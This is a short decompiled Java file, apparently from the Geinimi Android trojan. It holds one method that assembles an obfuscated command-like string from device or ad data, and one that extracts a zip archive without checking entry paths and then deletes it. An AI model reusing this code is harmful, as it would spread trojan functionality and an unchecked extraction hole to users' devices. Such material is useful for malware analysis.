package com.geinimi.c;

import com.geinimi.AdPushable;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.util.zip.ZipEntry;
import java.util.zip.ZipInputStream;

public final class n {
    public static void a(AdPushable adPushable) {
        l.a(adPushable.c(), m.a(63) + k.f + m.a(43) + k.s + m.a(44) + adPushable.e() + m.a(45) + k.b() + m.a(46) + k.c() + m.a(47) + k.d() + m.a(67) + k.e() + m.a(68) + k.f() + m.a(69) + k.g() + m.a(48) + adPushable.d());
    }

    public static void a(File file, String str) {
        FileInputStream fileInputStream = new FileInputStream(file);
        ZipInputStream zipInputStream = new ZipInputStream(fileInputStream);
        byte[] bArr = new byte[8192];
        while (true) {
            ZipEntry nextEntry = zipInputStream.getNextEntry();
            if (nextEntry != null) {
                File file2 = new File(str + nextEntry.getName());
                File file3 = new File(file2.getParentFile().getPath());
                if (nextEntry.isDirectory()) {
                    if (!file2.exists()) {
                        file2.mkdirs();
                    }
                    zipInputStream.closeEntry();
                } else {
                    if (!file3.exists()) {
                        file3.mkdirs();
                    }
                    FileOutputStream fileOutputStream = new FileOutputStream(file2);
                    while (true) {
                        int read = zipInputStream.read(bArr);
                        if (read == -1) {
                            break;
                        }
                        fileOutputStream.write(bArr, 0, read);
                    }
                    zipInputStream.closeEntry();
                    fileOutputStream.close();
                }
            } else {
                fileInputStream.close();
                zipInputStream.close();
                file.delete();
                return;
            }
        }
    }
}
